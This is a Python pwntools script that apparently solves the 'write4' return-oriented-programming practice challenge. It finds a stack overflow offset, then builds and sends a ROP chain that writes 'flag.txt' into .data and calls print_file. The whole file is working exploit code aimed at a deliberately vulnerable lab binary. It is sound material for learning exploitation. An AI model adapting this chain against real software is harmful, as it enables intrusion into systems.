#!/usr/bin/env python3
from pwn import *

# set up context
elf = context.binary = ELF('write4')
context.log_level = 'debug'

# find offset
io = process(elf.path)
io.sendline(cyclic(128))
io.wait()
core = io.corefile
stack = core.rsp
offset = core.read(stack, 4)

# craft payload
'''
--- HIGH ---
funcptr -> print_file()
arg     -- 0x7ffffffde100  -> "flag.txt"
gadget  -> pop rdi; ret;
gadget  -> mov qword ptr [r14], r15; ret;
string  -- "flag.txt" (8 bytes) (to r15)
straddr -- 0x00601028 (to r14)
gadget  -> pop r14; pop r15; ret; 
--- LOW  ---
'''
pop_r14_r15 = 0x0000000000400690  # pop r14; pop r15; ret; 
write_data = 0x0000000000400628  # mov qword ptr [r14], r15; ret;
straddr = 0x00601028  # .data
pop_rdi = 0x0000000000400693  # pop rdi; ret;
payload = fit(
    { offset : pop_r14_r15 },
    straddr,
    b'flag.txt',
    write_data,
    pop_rdi,
    straddr,
    elf.symbols.print_file
)
open('payload.bin', 'wb').write(payload)

# send payload
io = process(elf.path)
io.recvuntil('> ')
io.sendline(payload)
io.recvuntil(b'Thank you!\n')
print(io.recvline().decode('utf-8'))
